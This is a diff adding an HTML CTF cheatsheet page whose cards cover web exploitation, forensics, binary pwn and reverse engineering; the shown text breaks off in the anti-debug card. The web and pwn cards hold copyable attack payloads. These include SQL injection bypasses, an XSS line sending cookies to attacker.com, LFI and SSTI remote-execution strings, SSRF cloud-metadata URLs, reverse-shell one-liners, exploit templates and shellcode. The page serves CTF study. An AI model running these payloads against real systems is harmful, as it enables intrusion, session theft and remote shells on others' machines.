@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Cheatsheet // 0xHACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<header>
+  <div class="logo">0x<span>HACK</span> CTF</div>
+  <nav>
+    <a href="#web">WEB</a>
+    <a href="#forensics">FORENSICS</a>
+    <a href="#pwn">PWN</a>
+    <a href="#re">REV</a>
+    <a href="#crypto">CRYPTO</a>
+    <a href="#network">NETWORK</a>
+    <a href="#stego">STEGO</a>
+    <a href="#osint">OSINT</a>
+    <a href="#hardware">HARDWARE</a>
+    <a href="#misc">MISC</a>
+  </nav>
+</header>
+
+<div class="hero">
+  <div class="hero-grid"></div>
+  <h1>CTF <em>CHEATSHEET</em></h1>
+  <p>// COMPLETE REFERENCE — WEB · FORENSICS · PWN · RE · CRYPTO · NETWORK · STEGO · OSINT · HARDWARE</p>
+  <div class="search-bar">
+    <input type="text" id="searchInput" placeholder="search commands, tools, techniques..." oninput="search(this.value)">
+  </div>
+  <div class="search-count" id="searchCount"></div>
+</div>
+
+<main>
+
+<aside class="sidebar">
+  <div class="sidebar-title">CATEGORIES</div>
+  <a href="#web"><span class="dot" style="background:#0a84ff"></span> Web Exploitation</a>
+  <a href="#forensics"><span class="dot" style="background:#30d158"></span> Forensics</a>
+  <a href="#pwn"><span class="dot" style="background:#ff453a"></span> Binary Pwn</a>
+  <a href="#re"><span class="dot" style="background:#bf5af2"></span> Reverse Engineering</a>
+  <a href="#crypto"><span class="dot" style="background:#ffd60a"></span> Cryptography</a>
+  <a href="#network"><span class="dot" style="background:#00e5ff"></span> Network</a>
+  <a href="#stego"><span class="dot" style="background:#ff9f0a"></span> Steganography</a>
+  <a href="#osint"><span class="dot" style="background:#63e6be"></span> OSINT</a>
+  <a href="#hardware"><span class="dot" style="background:#ff6b35"></span> Hardware</a>
+  <a href="#misc"><span class="dot" style="background:#a0a0a0"></span> Misc / Other</a>
+</aside>
+
+<div class="content" id="content">
+
+<!-- ===== WEB ===== -->
+<section class="section web" id="web">
+  <div class="section-header">
+    <div class="section-icon">🌐</div>
+    <div>
+      <div class="section-title">WEB EXPLOITATION</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">SQLi · XSS · LFI · SSRF · SSTI · IDOR · CSRF · XXE</div>
+    </div>
+    <span class="section-tag">WEB</span>
+  </div>
+
+  <div class="cards">
+    <div class="card web">
+      <div class="card-title">SQL INJECTION</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Detection</span>
+<span class="c">'</span>  <span class="c">''</span>  <span class="c">`</span>  <span class="c">1'</span>  <span class="c">1 OR 1=1--</span>  <span class="c">1' OR '1'='1</span>
+
+<span class="cm"># Auth bypass</span>
+admin'<span class="f">--</span>
+' OR 1=1<span class="f">--</span>
+' OR 'x'='x
+<span class="s">') OR ('1'='1</span>
+
+<span class="cm"># Union-based</span>
+<span class="c">ORDER BY 1--  </span><span class="cm"># find columns</span>
+<span class="c">UNION SELECT NULL,NULL,NULL--</span>
+<span class="c">UNION SELECT 1,database(),3--</span>
+<span class="c">UNION SELECT 1,table_name,3 FROM information_schema.tables--</span>
+<span class="c">UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--</span>
+
+<span class="cm"># Blind (boolean)</span>
+<span class="c">1' AND SUBSTRING(password,1,1)='a'--</span>
+<span class="c">1' AND (SELECT COUNT(*) FROM users)>0--</span>
+
+<span class="cm"># Time-based blind</span>
+<span class="c">1'; IF(1=1,SLEEP(5),0)--</span>
+<span class="c">1' AND SLEEP(5)--</span>
+
+<span class="cm"># sqlmap</span>
+<span class="c">sqlmap</span> <span class="f">-u</span> <span class="s">"http://site.com/page?id=1"</span> <span class="f">--dbs</span>
+<span class="c">sqlmap</span> <span class="f">-u</span> <span class="s">"http://site.com/"</span> <span class="f">--data</span> <span class="s">"user=a&pass=b"</span> <span class="f">--dump</span>
+<span class="c">sqlmap</span> <span class="f">-r</span> request.txt <span class="f">--level=5 --risk=3</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">XSS — CROSS SITE SCRIPTING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Basic probes</span>
+<span class="s">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="s">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="s">&lt;svg onload=alert(1)&gt;</span>
+<span class="s">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="s">javascript:alert(1)</span>
+
+<span class="cm"># Filter bypass</span>
+<span class="s">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span>
+<span class="s">&lt;img src=x onerror=&#97;lert(1)&gt;</span>
+<span class="s">&lt;details open ontoggle=alert(1)&gt;</span>
+<span class="s">&lt;input autofocus onfocus=alert(1)&gt;</span>
+
+<span class="cm"># Cookie steal</span>
+<span class="s">&lt;script&gt;document.location='http://attacker.com/c?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="cm"># DOM XSS sources</span>
+document.URL / document.location
+location.hash / location.search
+document.referrer / window.name</code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">LFI / RFI / PATH TRAVERSAL</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Basic LFI</span>
+?file=../../../../etc/passwd
+?page=../../../etc/shadow
+
+<span class="cm"># Null byte (PHP &lt;5.3)</span>
+?file=../../../../etc/passwd%00
+
+<span class="cm"># Wrapper bypasses</span>
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://input  <span class="cm"># POST: &lt;?php system($_GET['cmd']); ?&gt;</span>
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+?file=zip://shell.zip%23shell.php
+
+<span class="cm"># Useful files</span>
+/etc/passwd          /etc/shadow
+/proc/self/environ   /proc/self/cmdline
+/var/log/apache2/access.log  <span class="cm"># log poisoning</span>
+C:\Windows\win.ini
+C:\xampp\htdocs\index.php</code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">SSRF — SERVER SIDE REQUEST FORGERY</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Basic</span>
+url=http://localhost/admin
+url=http://127.0.0.1:22
+url=http://169.254.169.254/latest/meta-data/  <span class="cm"># AWS</span>
+
+<span class="cm"># Bypass filters</span>
+http://2130706433/          <span class="cm"># 127.0.0.1 decimal</span>
+http://0x7f000001/          <span class="cm"># hex</span>
+http://127.1/
+http://[::1]/               <span class="cm"># IPv6</span>
+http://user@127.0.0.1/
+http://127.0.0.1.attacker.com/
+
+<span class="cm"># Cloud metadata</span>
+http://169.254.169.254/latest/meta-data/iam/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/v1/  <span class="cm"># DigitalOcean</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">SSTI — SERVER SIDE TEMPLATE INJECTION</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Detection</span>
+{{7*7}}  ${7*7}  #{7*7}  *{7*7}  <span class="cm"># → 49?</span>
+{{7*'7'}}  <span class="cm"># Jinja2: 7777777, Twig: 49</span>
+
+<span class="cm"># Jinja2 (Python/Flask)</span>
+{{config}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['os'].popen('id').read()}}
+
+<span class="cm"># Simpler Jinja2 RCE</span>
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+<span class="cm"># Twig (PHP)</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+<span class="cm"># Freemarker (Java)</span>
+${"freemarker.template.utility.Execute"?new()("id")}</code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">JWT ATTACKS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Decode token</span>
+echo "BASE64_PAYLOAD" | base64 -d
+
+<span class="cm"># alg:none attack</span>
+<span class="cm"># Change header to: {"alg":"none","typ":"JWT"}</span>
+<span class="cm"># Remove signature, keep trailing dot</span>
+
+<span class="cm"># RS256 → HS256 confusion</span>
+<span class="cm"># Use the public key as HS256 HMAC secret</span>
+
+<span class="cm"># Crack weak secret</span>
+hashcat -a 0 -m 16500 token.jwt wordlist.txt
+john --wordlist=rockyou.txt jwt.txt
+
+<span class="cm"># jwt_tool</span>
+python3 jwt_tool.py TOKEN -X a       <span class="cm"># alg:none</span>
+python3 jwt_tool.py TOKEN -X s       <span class="cm"># self-signed</span>
+python3 jwt_tool.py TOKEN -C -d rockyou.txt  <span class="cm"># crack</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">COMMAND INJECTION</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Separators</span>
+; id        | id        || id
+& id        && id       `id`
+$(id)       %0a id      \nid
+
+<span class="cm"># Blind (time-based)</span>
+; sleep 5
+| ping -c 5 127.0.0.1
+
+<span class="cm"># Filter bypass</span>
+c$()at /etc/passwd       <span class="cm"># empty cmd sub</span>
+/bin/c?t /etc/passwd     <span class="cm"># wildcard</span>
+cat${IFS}/etc/passwd     <span class="cm"># IFS instead of space</span>
+{cat,/etc/passwd}
+
+<span class="cm"># Reverse shell one-liners</span>
+bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+nc -e /bin/sh ATTACKER 4444</code></pre>
+      </div>
+    </div>
+
+    <div class="card web">
+      <div class="card-title">COMMON TOOLS</div>
+      <div class="card-body">
+        <table>
+          <tr><th>TOOL</th><th>USE</th></tr>
+          <tr><td>sqlmap</td><td>Automated SQL injection</td></tr>
+          <tr><td>burpsuite</td><td>HTTP proxy / scanner / intruder</td></tr>
+          <tr><td>gobuster</td><td>Dir/file/vhost brute force</td></tr>
+          <tr><td>ffuf</td><td>Fast fuzzer (params, dirs)</td></tr>
+          <tr><td>nikto</td><td>Web server scanner</td></tr>
+          <tr><td>wfuzz</td><td>Web fuzzer</td></tr>
+          <tr><td>jwt_tool</td><td>JWT attack toolkit</td></tr>
+          <tr><td>XSStrike</td><td>Advanced XSS scanner</td></tr>
+        </table>
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="c">gobuster dir</span> <span class="f">-u</span> http://site.com <span class="f">-w</span> /usr/share/wordlists/dirb/common.txt
+<span class="c">ffuf</span> <span class="f">-u</span> http://site.com/FUZZ <span class="f">-w</span> wordlist.txt <span class="f">-mc</span> 200,301</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== FORENSICS ===== -->
+<section class="section forensics" id="forensics">
+  <div class="section-header">
+    <div class="section-icon">🔍</div>
+    <div>
+      <div class="section-title">DIGITAL FORENSICS</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">DISK · MEMORY · PCAP · IMG · METADATA · FILE CARVING</div>
+    </div>
+    <span class="section-tag">FORENSICS</span>
+  </div>
+
+  <div class="cards">
+    <div class="card forensics">
+      <div class="card-title">FILE IDENTIFICATION</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="c">file</span> suspicious.*
+<span class="c">xxd</span> file | head -20         <span class="cm"># hex dump / magic bytes</span>
+<span class="c">binwalk</span> file               <span class="cm"># embedded signatures</span>
+<span class="c">binwalk</span> <span class="f">-e</span> file            <span class="cm"># extract all</span>
+<span class="c">exiftool</span> file              <span class="cm"># metadata</span>
+<span class="c">strings</span> <span class="f">-n 8</span> file          <span class="cm"># printable strings ≥8 chars</span>
+<span class="c">strings</span> file | grep <span class="f">-i</span> <span class="s">"flag\|ctf\|pico"</span>
+<span class="c">hexdump</span> <span class="f">-C</span> file | head</code></pre>
+        <div class="divider"></div>
+        <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">MAGIC BYTES</div>
+        <table>
+          <tr><th>HEX</th><th>TYPE</th></tr>
+          <tr><td>FF D8 FF</td><td>JPEG</td></tr>
+          <tr><td>89 50 4E 47</td><td>PNG</td></tr>
+          <tr><td>47 49 46 38</td><td>GIF</td></tr>
+          <tr><td>50 4B 03 04</td><td>ZIP / DOCX / APK</td></tr>
+          <tr><td>25 50 44 46</td><td>PDF</td></tr>
+          <tr><td>7F 45 4C 46</td><td>ELF binary</td></tr>
+          <tr><td>4D 5A</td><td>PE (Windows EXE)</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="card forensics">
+      <div class="card-title">DISK / IMG FORENSICS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Partition info</span>
+<span class="c">fdisk</span> <span class="f">-l</span> disk.img
+<span class="c">mmls</span> disk.img
+
+<span class="cm"># Mount (offset = start_sector × 512)</span>
+<span class="c">sudo mount</span> <span class="f">-o loop,offset=</span>1048576 disk.img /mnt/img
+
+<span class="cm"># Filesystem info</span>
+<span class="c">fsstat</span> disk.img
+
+<span class="cm"># List all files (incl. deleted)</span>
+<span class="c">fls</span> <span class="f">-r</span> disk.img
+<span class="c">fls</span> <span class="f">-rp</span> disk.img | grep <span class="f">-i</span> <span class="s">"\*"</span>   <span class="cm"># only deleted</span>
+
+<span class="cm"># Extract by inode</span>
+<span class="c">icat</span> disk.img &lt;inode&gt; &gt; recovered_file
+
+<span class="cm"># Recover all deleted</span>
+<span class="c">tsk_recover</span> disk.img ./recovered/
+<span class="c">photorec</span> disk.img            <span class="cm"># GUI file carver</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card forensics">
+      <div class="card-title">MEMORY FORENSICS (VOLATILITY)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Volatility 3</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.info</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.pslist</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.pstree</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.cmdline</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.filescan</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.dumpfiles</span> <span class="f">--physaddr</span> ADDR
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.netscan</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">windows.hashdump</span>
+
+<span class="cm"># Linux</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">linux.bash</span>
+<span class="c">python3 vol.py</span> <span class="f">-f</span> mem.raw <span class="c">linux.psaux</span>
+
+<span class="cm"># Grep strings in memory</span>
+<span class="c">strings</span> mem.raw | grep <span class="f">-i</span> <span class="s">"flag\|ctf\|password"</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card forensics">
+      <div class="card-title">PCAP / NETWORK CAPTURE</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Wireshark filters</span>
+http                          <span class="cm"># HTTP only</span>
+http.request.method == "POST"
+tcp contains "flag"
+frame contains "CTF{"
+dns.qry.name contains "evil"
+ftp-data                      <span class="cm"># FTP transfers</span>
+smtp                          <span class="cm"># email</span>
+
+<span class="cm"># tshark CLI</span>
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">-Y</span> <span class="s">"http"</span>
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">-T fields -e</span> http.file_data
+<span class="c">tshark</span> <span class="f">-r</span> cap.pcap <span class="f">--export-objects</span> http,./output/
+
+<span class="cm"># Extract files</span>
+<span class="cm"># Wireshark → File → Export Objects → HTTP/SMB/FTP</span>
+
+<span class="cm"># Follow TCP stream</span>
+<span class="cm"># Right click packet → Follow → TCP Stream</span>
+
+<span class="cm"># strings in pcap</span>
+<span class="c">strings</span> cap.pcap | grep <span class="f">-i</span> <span class="s">"flag\|ctf"</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card forensics">
+      <div class="card-title">FILE CARVING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="c">foremost</span> <span class="f">-i</span> file.img <span class="f">-o</span> ./out/
+<span class="c">scalpel</span> <span class="f">-o</span> ./out/ file.img
+<span class="c">photorec</span> file.img
+<span class="c">binwalk</span> <span class="f">-e --dd='.*'</span> file  <span class="cm"># carve everything</span>
+
+<span class="cm"># Manual carve with dd</span>
+<span class="c">dd</span> <span class="f">if=</span>file.img <span class="f">of=</span>carved.jpg <span class="f">bs=1 skip=</span>&lt;offset&gt; <span class="f">count=</span>&lt;size&gt;</code></pre>
+        <div class="alert alert-tip">💡 Run <code>binwalk</code> first — it finds 80% of CTF embedded files automatically</div>
+      </div>
+    </div>
+
+    <div class="card forensics">
+      <div class="card-title">LOG ANALYSIS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># grep for suspicious activity</span>
+<span class="c">grep</span> <span class="f">-i</span> <span class="s">"union\|select\|../\|cmd="</span> access.log
+<span class="c">grep</span> <span class="s">" 200 "</span> access.log | sort | uniq <span class="f">-c</span> | sort <span class="f">-rn</span>
+<span class="c">awk</span> <span class="s">'{print $1}'</span> access.log | sort | uniq <span class="f">-c</span> | sort <span class="f">-rn</span>
+
+<span class="cm"># Decode URL-encoded strings</span>
+<span class="c">python3</span> <span class="f">-c</span> <span class="s">"from urllib.parse import unquote; print(unquote('%3cscript%3e'))"</span>
+
+<span class="cm"># Windows Event Logs (.evtx)</span>
+<span class="c">python3</span> <span class="f">-m</span> evtxdump &lt;file.evtx&gt;
+<span class="cm"># Chainsaw / Hayabusa for threat hunting</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== PWN ===== -->
+<section class="section pwn" id="pwn">
+  <div class="section-header">
+    <div class="section-icon">💣</div>
+    <div>
+      <div class="section-title">BINARY EXPLOITATION (PWN)</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">BOF · ROP · FORMAT STRING · HEAP · SHELLCODE</div>
+    </div>
+    <span class="section-tag">PWN</span>
+  </div>
+
+  <div class="cards">
+    <div class="card pwn">
+      <div class="card-title">RECON & SETUP</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Protections check</span>
+<span class="c">checksec</span> <span class="f">--file=</span>binary
+<span class="cm"># NX · Stack Canary · PIE · RELRO · ASLR</span>
+
+<span class="cm"># Architecture</span>
+<span class="c">file</span> binary
+<span class="c">readelf</span> <span class="f">-h</span> binary
+
+<span class="cm"># Symbols</span>
+<span class="c">nm</span> binary
+<span class="c">objdump</span> <span class="f">-d</span> binary | grep <span class="f">-A5</span> <span class="s">"&lt;win&gt;\|&lt;flag&gt;"</span>
+<span class="c">readelf</span> <span class="f">-s</span> binary | grep <span class="s">"win\|flag\|system"</span>
+
+<span class="cm"># Dynamic analysis</span>
+<span class="c">ltrace</span> ./binary    <span class="cm"># library calls</span>
+<span class="c">strace</span> ./binary    <span class="cm"># syscalls</span>
+<span class="c">gdb</span> ./binary       <span class="cm"># debugger</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card pwn">
+      <div class="card-title">STACK BUFFER OVERFLOW</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Find offset with cyclic pattern</span>
+<span class="c">cyclic 200</span>            <span class="cm"># in pwndbg</span>
+<span class="c">cyclic -l 0x61616174</span>  <span class="cm"># find offset from crash value</span>
+
+<span class="cm"># GDB / pwndbg commands</span>
+<span class="c">run</span>                    <span class="cm"># start</span>
+<span class="c">info functions</span>         <span class="cm"># list functions</span>
+<span class="c">disassemble win</span>        <span class="cm"># disasm function</span>
+<span class="c">p win</span>                  <span class="cm"># print address</span>
+<span class="c">x/20wx $rsp</span>            <span class="cm"># examine stack</span>
+
+<span class="cm"># 64-bit exploit template</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+elf = ELF(<span class="s">'./binary'</span>)
+p = process(<span class="s">'./binary'</span>)  <span class="cm"># or remote("host",port)</span>
+offset = 40  <span class="cm"># 32+8 or find with cyclic</span>
+win = elf.symbols[<span class="s">'win'</span>]
+ret = next(elf.search(asm(<span class="s">'ret'</span>)))  <span class="cm"># stack align</span>
+payload = b<span class="s">'A'</span>*offset + p64(ret) + p64(win)
+p.sendline(payload)
+p.interactive()</code></pre>
+      </div>
+    </div>
+
+    <div class="card pwn">
+      <div class="card-title">ROP — RETURN ORIENTED PROGRAMMING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Find gadgets</span>
+<span class="c">ROPgadget</span> <span class="f">--binary</span> binary
+<span class="c">ROPgadget</span> <span class="f">--binary</span> binary <span class="f">--rop</span> | grep <span class="s">": ret"</span>
+<span class="c">ropper</span> <span class="f">-f</span> binary
+
+<span class="cm"># ret2libc (no PIE / known libc)</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+elf = ELF(<span class="s">'./binary'</span>)
+libc = ELF(<span class="s">'./libc.so.6'</span>)
+p = process(<span class="s">'./binary'</span>)
+rop = ROP(elf)
+
+<span class="cm"># Leak libc base</span>
+rop.puts(elf.got[<span class="s">'puts'</span>])
+rop.main()
+
+<span class="cm"># Calculate offsets and call system("/bin/sh")</span>
+libc.address = leaked_puts - libc.symbols[<span class="s">'puts'</span>]
+binsh = next(libc.search(b<span class="s">'/bin/sh\x00'</span>))
+system = libc.symbols[<span class="s">'system'</span>]</code></pre>
+      </div>
+    </div>
+
+    <div class="card pwn">
+      <div class="card-title">FORMAT STRING</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Detection: printf(user_input) with no format</span>
+
+<span class="cm"># Leak stack values</span>
+%p %p %p %p %p %p %p
+%1$p %2$p %3$p %4$p   <span class="cm"># positional</span>
+
+<span class="cm"># Leak specific position</span>
+%7$s                   <span class="cm"># 7th arg as string</span>
+%7$x                   <span class="cm"># 7th arg as hex</span>
+
+<span class="cm"># Write to memory (4 bytes)</span>
+%&lt;n&gt;c%11$n            <span class="cm"># write n at 11th arg addr</span>
+
+<span class="cm"># pwntools automation</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+p = process(<span class="s">'./vuln'</span>)
+fmt = fmtstr_payload(offset, {target_addr: value})
+p.sendline(fmt)
+
+<span class="cm"># Find format string offset</span>
+<span class="k">for</span> i <span class="k">in</span> range(1, 50):
+    p = process(<span class="s">'./vuln'</span>)
+    p.sendline(f<span class="s">"AAAA.%{i}$x"</span>)
+    out = p.recv()
+    <span class="k">if</span> b<span class="s">'41414141'</span> <span class="k">in</span> out:
+        print(f<span class="s">"Offset: {i}"</span>)</code></pre>
+      </div>
+    </div>
+
+    <div class="card pwn">
+      <div class="card-title">SHELLCODE</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># pwntools shellcode</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">'amd64'</span>   <span class="cm"># or 'i386'</span>
+sc = asm(shellcraft.sh())
+print(sc.hex())
+
+<span class="cm"># Manual x86-64 /bin/sh</span>
+\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0
+\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53
+\x48\x89\xe7\xb0\x3b\x0f\x05
+
+<span class="cm"># Run shellcode conditions:</span>
+<span class="cm"># NX must be DISABLED (rwx stack)</span>
+<span class="cm"># Need to know/leak stack addr</span>
+<span class="cm"># Or use JIT spraying, heap spray</span>
+
+<span class="cm"># SROP (Sigreturn)</span>
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr</code></pre>
+      </div>
+    </div>
+
+    <div class="card pwn">
+      <div class="card-title">HEAP EXPLOITATION</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># Heap vulns: UAF, double-free, overflow into metadata</span>
+
+<span class="cm"># Tcache poisoning (glibc ≥ 2.26)</span>
+<span class="cm"># 1. free chunk into tcache</span>
+<span class="cm"># 2. corrupt fd pointer → fake chunk addr</span>
+<span class="cm"># 3. malloc twice → get fake chunk</span>
+
+<span class="cm"># Heap analysis in GDB (pwndbg)</span>
+<span class="c">heap</span>          <span class="cm"># list chunks</span>
+<span class="c">bins</span>          <span class="cm"># free bin contents</span>
+<span class="c">vis_heap_chunks</span>
+<span class="c">malloc_chunk &lt;addr&gt;</span>
+
+<span class="cm"># House of Force / Tcache dup</span>
+<span class="cm"># See: how2heap repo by shellphish</span>
+<span class="cm"># git clone https://github.com/shellphish/how2heap</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== RE ===== -->
+<section class="section re" id="re">
+  <div class="section-header">
+    <div class="section-icon">🔬</div>
+    <div>
+      <div class="section-title">REVERSE ENGINEERING</div>
+      <div style="color:var(--text-dim);font-size:10px;letter-spacing:1px">STATIC · DYNAMIC · DECOMPILE · ANTI-DEBUG · OBFUSCATION</div>
+    </div>
+    <span class="section-tag">REV</span>
+  </div>
+
+  <div class="cards">
+    <div class="card re">
+      <div class="card-title">STATIC ANALYSIS</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="c">file</span> binary
+<span class="c">strings</span> <span class="f">-n 6</span> binary | grep <span class="f">-i</span> <span class="s">"flag\|key\|pass"</span>
+<span class="c">objdump</span> <span class="f">-d</span> binary         <span class="cm"># disassemble</span>
+<span class="c">readelf</span> <span class="f">-a</span> binary         <span class="cm"># ELF headers</span>
+<span class="c">nm</span> <span class="f">--demangle</span> binary      <span class="cm"># symbols (C++)</span>
+<span class="c">ldd</span> binary                <span class="cm"># shared libs</span>
+
+<span class="cm"># Decompilers (GUI)</span>
+<span class="cm"># Ghidra: free, NSA, excellent</span>
+<span class="cm"># IDA Pro / IDA Free</span>
+<span class="cm"># Binary Ninja</span>
+<span class="cm"># Cutter (Rizin GUI)</span>
+
+<span class="cm"># CLI decompile</span>
+<span class="c">r2</span> <span class="f">-A</span> binary             <span class="cm"># radare2</span>
+<span class="c">r2</span> <span class="f">-A -q -c</span> <span class="s">"pdf @ main"</span> binary
+
+<span class="cm"># Python / Java</span>
+<span class="c">uncompyle6</span> file.pyc      <span class="cm"># Python bytecode</span>
+<span class="c">jadx</span> app.apk             <span class="cm"># Android / Java</span>
+<span class="c">procyon</span> jar.jar          <span class="cm"># JAR decompile</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card re">
+      <div class="card-title">DYNAMIC ANALYSIS / GDB</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># GDB with pwndbg/peda/gef</span>
+<span class="c">gdb</span> ./binary
+<span class="c">b main</span>               <span class="cm"># breakpoint at main</span>
+<span class="c">b *0x401234</span>          <span class="cm"># breakpoint at address</span>
+<span class="c">r</span>                    <span class="cm"># run</span>
+<span class="c">n</span>                    <span class="cm"># next (step over)</span>
+<span class="c">s</span>                    <span class="cm"># step into</span>
+<span class="c">c</span>                    <span class="cm"># continue</span>
+<span class="c">x/20wx $rsp</span>          <span class="cm"># examine stack (64-bit)</span>
+<span class="c">x/s 0x402010</span>         <span class="cm"># examine string at addr</span>
+<span class="c">info registers</span>       <span class="cm"># all registers</span>
+<span class="c">set $rax=1</span>           <span class="cm"># modify register</span>
+<span class="c">patch byte 0x401234 0x90</span>  <span class="cm"># NOP patch</span>
+
+<span class="cm"># strace / ltrace</span>
+<span class="c">strace</span> <span class="f">-e</span> trace=open,read,write ./binary
+<span class="c">ltrace</span> <span class="f">-i</span> ./binary    <span class="cm"># strcmp, malloc calls</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card re">
+      <div class="card-title">ANTI-DEBUG BYPASSES</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyCode(this)">COPY</button><code><span class="cm"># ptrace anti-debug</span>
+<span class="cm"># Patch: change JNZ to JZ after ptrace call</span>
+<span class="cm"># Or: set return value: set $rax=0 in gdb</span>
+
+<span class="cm"># Timing checks</span>
+<span class="cm"># Patch out RDTSC or set fixed value</span>
+
+<span class="cm"># IsDebuggerPresent (Windows)</span>
+<span class="cm"># Patch PEB.BeingDebugged = 0</span>
+<span class="cm"># Or use ScyllaHide plugin for x64dbg</span>
+
+<span class="cm"># Self-modifying / obfuscated</span>
